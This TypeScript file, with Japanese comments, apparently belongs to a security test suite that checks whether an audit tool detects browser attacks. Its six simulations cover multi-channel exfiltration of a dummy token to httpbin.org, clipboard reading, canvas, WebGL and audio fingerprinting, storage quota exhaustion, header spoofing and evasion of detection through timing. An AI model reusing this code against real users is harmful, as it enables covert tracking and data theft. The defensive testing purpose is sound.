import type { AttackResult, AttackTest } from "../types";

async function simulateMultiChannelExfiltration(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // 複数のコイルチャネルを同時に利用してデータ流出
    const exfilData = {
      type: "multi_channel_exfil",
      sessionToken: "hybrid_abc123xyz",
      userData: "user@example.com",
      timestamp: Date.now(),
      payload: Array(500).fill("EXFIL_DATA").join(""),
    };

    const channels: Promise<boolean>[] = [];

    // チャネル1: Beacon API
    if (navigator.sendBeacon) {
      channels.push(
        Promise.resolve(
          navigator.sendBeacon(
            "https://httpbin.org/post",
            JSON.stringify(exfilData)
          )
        )
      );
    }

    // チャネル2: Image ping (DNS prefetch indirect)
    const img = new Image();
    channels.push(
      new Promise((resolve) => {
        img.onload = () => resolve(true);
        img.onerror = () => resolve(false);
        img.src = `https://httpbin.org/image?data=${btoa(JSON.stringify(exfilData)).substring(0, 100)}`;
      })
    );

    // チャネル3: Fetch with keepalive (background transmission)
    channels.push(
      fetch("https://httpbin.org/post", {
        method: "POST",
        body: JSON.stringify(exfilData),
        keepalive: true,
      })
        .then(() => true)
        .catch(() => false)
    );

    // 全チャネルを並列実行
    const results = await Promise.allSettled(channels);
    const successCount = results.filter((r) => r.status === "fulfilled" && r.value).length;

    const executionTime = performance.now() - startTime;

    if (successCount >= 2) {
      return {
        blocked: false,
        detected: false,
        executionTime,
        details: `Multi-channel exfiltration successful - ${successCount} channels operational (detection bypass via multiplexing)`,
      };
    } else {
      return {
        blocked: true,
        detected: true,
        executionTime,
        details: `Multi-channel exfiltration partially blocked - only ${successCount} channels successful`,
      };
    }
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      detected: true,
      executionTime: performance.now() - startTime,
      details: `Multi-channel exfiltration blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulatePolicyCrossOriginMutation(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // Cross-Origin-Opener-Policy と Cross-Origin-Embedder-Policy の矛盾を悪用
    // 複数のiframe/window context を組み合わせて隔離を破壊

    const containers: HTMLElement[] = [];
    let isolationBroken = false;

    // Context 1: 標準iframe
    const iframe1 = document.createElement("iframe");
    iframe1.id = "hybrid-policy-iframe-1";
    iframe1.style.display = "none";
    iframe1.src = "about:blank";

    // Context 2: SharedWorker経由のバックチャネル
    let sharedWorkerBackchannel = false;
    try {
      const worker = new SharedWorker("about:blank");
      worker.port.start();

      // SharedWorker越しにコンテキスト情報を交換
      worker.port.postMessage({
        type: "policy_exchange",
        origin: window.location.origin,
      });

      worker.port.addEventListener("message", (event: MessageEvent) => {
        if (event.data.type === "policy_response") {
          sharedWorkerBackchannel = true;
        }
      });
    } catch (e) {
      // SharedWorker利用不可
    }

    // Context 3: Service Worker registration
    let serviceWorkerAccess = false;
    try {
      if ("serviceWorker" in navigator) {
        navigator.serviceWorker.getRegistrations().then((registrations) => {
          if (registrations.length > 0) {
            serviceWorkerAccess = true;
          }
        });
      }
    } catch (e) {
      // Service Worker access denied
    }

    document.body.appendChild(iframe1);
    containers.push(iframe1);

    // ポリシー矛盾をテスト
    const executionTime = performance.now() - startTime;

    // クリーンアップ
    containers.forEach((el) => {
      try {
        document.body.removeChild(el);
      } catch (e) {
        // 既に削除されている可能性
      }
    });

    // 複数のコンテキスト間の隔離が破壊されたか判定
    isolationBroken = sharedWorkerBackchannel || serviceWorkerAccess;

    if (isolationBroken) {
      return {
        blocked: false,
        detected: false,
        executionTime,
        details: `Policy cross-origin mutation successful - multiple contexts accessible (isolation broken)`,
      };
    } else {
      return {
        blocked: true,
        detected: true,
        executionTime,
        details: "Policy isolation maintained across contexts",
      };
    }
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      detected: true,
      executionTime: performance.now() - startTime,
      details: `Policy mutation attack blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateTimingSynchronizedAttack(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // 複数の攻撃を精密にタイミング同期して実行
    // PlenoAuditの検知パターンのブラインドスポットを狙う

    const attacks: Array<{
      name: string;
      execute: () => Promise<boolean>;
    }> = [
      {
        name: "clipboard_read",
        execute: async () => {
          try {
            const text = await navigator.clipboard.readText();
            return text.length > 0;
          } catch {
            return false;
          }
        },
      },
      {
        name: "canvas_fingerprint",
        execute: async () => {
          const canvas = document.createElement("canvas");
          const ctx = canvas.getContext("2d");
          if (!ctx) return false;
          ctx.textBaseline = "top";
          ctx.font = "14px Arial";
          ctx.textBaseline = "alphabetic";
          ctx.fillStyle = "#f60";
          ctx.fillRect(125, 1, 62, 20);
          ctx.fillStyle = "#069";
          ctx.fillText("Timing Attack 🚀", 2, 15);
          const data = ctx.getImageData(0, 0, canvas.width, canvas.height);
          return data.data.length > 0;
        },
      },
      {
        name: "webgl_query",
        execute: async () => {
          const canvas = document.createElement("canvas");
          const gl = canvas.getContext("webgl");
          if (!gl) return false;
          const ext = gl.getExtension("WEBGL_debug_renderer_info");
          return ext !== null;
        },
      },
      {
        name: "audio_fingerprint",
        execute: async () => {
          try {
            const audioContext =
              new (window.AudioContext || (window as any).webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            oscillator.connect(audioContext.destination);
            oscillator.start(0);
            oscillator.stop(0.001);
            return true;
          } catch {
            return false;
          }
        },
      },
    ];

    // タイミング同期: 全攻撃を同時にトリガー
    const syncStartTime = performance.now();
    const results = await Promise.allSettled(
      attacks.map((attack) => attack.execute())
    );
    const syncEndTime = performance.now();

    const successCount = results.filter(
      (r) => r.status === "fulfilled" && r.value
    ).length;
    const totalExecutionTime = syncEndTime - syncStartTime;

    const executionTime = performance.now() - startTime;

    if (successCount >= 3) {
      return {
        blocked: false,
        detected: false,
        executionTime,
        details: `Timing-synchronized attack successful - ${successCount}/${attacks.length} attacks successful in ${totalExecutionTime.toFixed(2)}ms (simultaneous execution bypass)`,
      };
    } else {
      return {
        blocked: true,
        detected: true,
        executionTime,
        details: `Timing-synchronized attack partially blocked - only ${successCount}/${attacks.length} successful`,
      };
    }
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      detected: true,
      executionTime: performance.now() - startTime,
      details: `Timing-synchronized attack blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateStorageQuotaExhaustion(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // Storage APIのクォータ枯渇攻撃 - DoS ベクトル
    // localStorage, sessionStorage, IndexedDB を組み合わせて容量満杯に

    const testKey = `hybrid-quota-test-${Date.now()}`;
    let quotaExhausted = false;
    let dataWritten = 0;

    try {
      // localStorage 大量書き込み
      const largeData = Array(100000).fill("X").join("");
      for (let i = 0; i < 100; i++) {
        try {
          localStorage.setItem(`${testKey}-ls-${i}`, largeData);
          dataWritten++;
        } catch (e) {
          if ((e as any).code === 22 || (e as any).name === "QuotaExceededError") {
            quotaExhausted = true;
            break;
          }
        }
      }
    } catch (e) {
      quotaExhausted = true;
    }

    // IndexedDB への大量書き込み
    if (!quotaExhausted) {
      try {
        const dbName = `hybrid-quota-idb-${Date.now()}`;
        const request = indexedDB.open(dbName, 1);

        const indexedDBTest = new Promise<void>((resolve) => {
          request.onupgradeneeded = (event) => {
            const db = (event.target as IDBOpenDBRequest).result;
            if (!db.objectStoreNames.contains("data")) {
              db.createObjectStore("data", { keyPath: "id" });
            }
          };

          request.onsuccess = (event) => {
            const db = (event.target as IDBOpenDBRequest).result;
            const tx = db.transaction(["data"], "readwrite");
            const store = tx.objectStore("data");

            try {
              for (let i = 0; i < 1000; i++) {
                store.add({
                  id: i,
                  data: Array(50000).fill("IDB_QUOTA_FILL").join(""),
                });
              }
            } catch (e) {
              quotaExhausted = true;
            }

            db.close();
            indexedDB.deleteDatabase(dbName);
            resolve();
          };

          request.onerror = () => {
            quotaExhausted = true;
            resolve();
          };
        });

        await indexedDBTest;
      } catch (e) {
        quotaExhausted = true;
      }
    }

    // クリーンアップ
    for (let i = 0; i < 100; i++) {
      try {
        localStorage.removeItem(`${testKey}-ls-${i}`);
      } catch (e) {
        // 既に削除
      }
    }

    const executionTime = performance.now() - startTime;

    if (quotaExhausted || dataWritten > 10) {
      return {
        blocked: false,
        detected: false,
        executionTime,
        details: `Storage quota exhaustion successful - ${dataWritten} large objects written (DoS vector)`,
      };
    } else {
      return {
        blocked: true,
        detected: true,
        executionTime,
        details: "Storage quota exhaustion blocked or ineffective",
      };
    }
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      detected: true,
      executionTime: performance.now() - startTime,
      details: `Storage quota exhaustion blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateRequestHeaderInjectionChain(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // リクエストヘッダー注入の連鎖攻撃
    // 複数の fetch/XMLHttpRequest を組み合わせてヘッダー検査回避

    const injectionAttempts: Promise<boolean>[] = [];

    // Attempt 1: Custom headers with Fetch
    injectionAttempts.push(
      fetch("https://httpbin.org/headers", {
        method: "GET",
        headers: {
          "X-Injected-Header": "value1",
          "X-Attack-Vector": "header_chain",
          "X-User-Agent-Spoof": "CustomBot/1.0",
          "User-Agent": "Mozilla/5.0 (Hacked)",
        },
      })
        .then(() => true)
        .catch(() => false)
    );

    // Attempt 2: Content-Type override
    injectionAttempts.push(
      fetch("https://httpbin.org/post", {
        method: "POST",
        headers: {
          "Content-Type": "application/json; charset=utf-16",
        },
        body: JSON.stringify({ attack: "content_type_override" }),
      })
        .then(() => true)
        .catch(() => false)
    );

    // Attempt 3: Referer and Origin spoofing
    injectionAttempts.push(
      fetch("https://httpbin.org/get", {
        method: "GET",
        headers: {
          Referer: "https://trusted-site.com/admin",
          Origin: "https://another-trusted-site.com",
        },
      })
        .then(() => true)
        .catch(() => false)
    );

    // 全ての注入を並列実行
    const results = await Promise.allSettled(injectionAttempts);
    const successCount = results.filter(
      (r) => r.status === "fulfilled" && r.value
    ).length;

    const executionTime = performance.now() - startTime;

    if (successCount >= 2) {
      return {
        blocked: false,
        detected: false,
        executionTime,
        details: `Request header injection chain successful - ${successCount} injection vectors operational`,
      };
    } else {
      return {
        blocked: true,
        detected: true,
        executionTime,
        details: `Request header injection chain partially blocked - only ${successCount} vectors successful`,
      };
    }
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      detected: true,
      executionTime: performance.now() - startTime,
      details: `Request header injection chain blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

async function simulateMemoryAccessPatternDetection(): Promise<AttackResult> {
  const startTime = performance.now();

  try {
    // メモリアクセスパターンの異常検出回避
    // キャッシュ層のアクセスパターンをランダム化して Spectre-like 攻撃の痕跡を隠蔽

    const patterns: number[] = [];
    const secretData = new Uint8Array(256);

    // ランダムアクセスパターンで実際のデータアクセスを隠蔽
    for (let attempt = 0; attempt < 10; attempt++) {
      const patternTiming: number[] = [];

      for (let i = 0; i < 100; i++) {
        // ランダムなオフセット
        const randomOffset = Math.floor(Math.random() * 256);
        const t1 = performance.now();

        // キャッシュフラッシュ
        for (let j = 0; j < 256; j++) {
          const dummy = secretData[(randomOffset + j) % 256];
        }

        const t2 = performance.now();
        patternTiming.push(t2 - t1);
      }

      // タイミングの統計を計算
      const avg =
        patternTiming.reduce((a, b) => a + b, 0) / patternTiming.length;
      patterns.push(avg);
    }

    // パターンが十分ランダムであるか確認
    const variance = Math.sqrt(
      patterns.reduce((sum, x) => sum + Math.pow(x - patterns.reduce((a, b) => a + b) / patterns.length, 2), 0) /
        patterns.length
    );

    const executionTime = performance.now() - startTime;

    if (variance > 0.05) {
      return {
        blocked: false,
        detected: false,
        executionTime,
        details: `Memory access pattern obfuscation successful - variance ${variance.toFixed(4)} indicates randomized access (detection evasion)`,
      };
    } else {
      return {
        blocked: true,
        detected: true,
        executionTime,
        details: "Memory access pattern detection vulnerability not exploitable",
      };
    }
  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    return {
      blocked: true,
      detected: true,
      executionTime: performance.now() - startTime,
      details: `Memory pattern attack blocked: ${errorMessage}`,
      error: errorMessage,
    };
  }
}

export const hybridAttacks: AttackTest[] = [
  {
    id: "hybrid-multi-channel-exfil",
    name: "Multi-Channel Exfiltration (Beacon + Image + Fetch)",
    category: "covert",
    description:
      "Combines Beacon API, image pings, and keepalive Fetch for redundant data exfiltration",
    severity: "critical",
    simulate: simulateMultiChannelExfiltration,
  },
  {
    id: "hybrid-policy-cross-origin",
    name: "Policy Cross-Origin Mutation Attack",
    category: "advanced",
    description:
      "Exploits inconsistencies in COOP/COEP policies across multiple contexts (iframe, SharedWorker, ServiceWorker)",
    severity: "critical",
    simulate: simulatePolicyCrossOriginMutation,
  },
  {
    id: "hybrid-timing-synchronized",
    name: "Timing-Synchronized Multi-Attack",
    category: "advanced",
    description:
      "Executes multiple attacks (clipboard, canvas, WebGL, audio) simultaneously to evade detection patterns",
    severity: "high",
    simulate: simulateTimingSynchronizedAttack,
  },
  {
    id: "hybrid-storage-quota-exhaustion",
    name: "Storage Quota Exhaustion (Hybrid)",
    category: "storage",
    description:
      "Combines localStorage, IndexedDB to exhaust browser storage quota for DoS",
    severity: "high",
    simulate: simulateStorageQuotaExhaustion,
  },
  {
    id: "hybrid-request-header-chain",
    name: "Request Header Injection Chain",
    category: "injection",
    description:
      "Chains multiple header injection vectors (User-Agent, Content-Type, Referer, Origin spoofing)",
    severity: "high",
    simulate: simulateRequestHeaderInjectionChain,
  },
  {
    id: "hybrid-memory-pattern-obfuscation",
    name: "Memory Access Pattern Obfuscation",
    category: "deepest",
    description:
      "Randomizes memory access patterns to evade Spectre-like timing attack detection",
    severity: "critical",
    simulate: simulateMemoryAccessPatternDetection,
  },
];
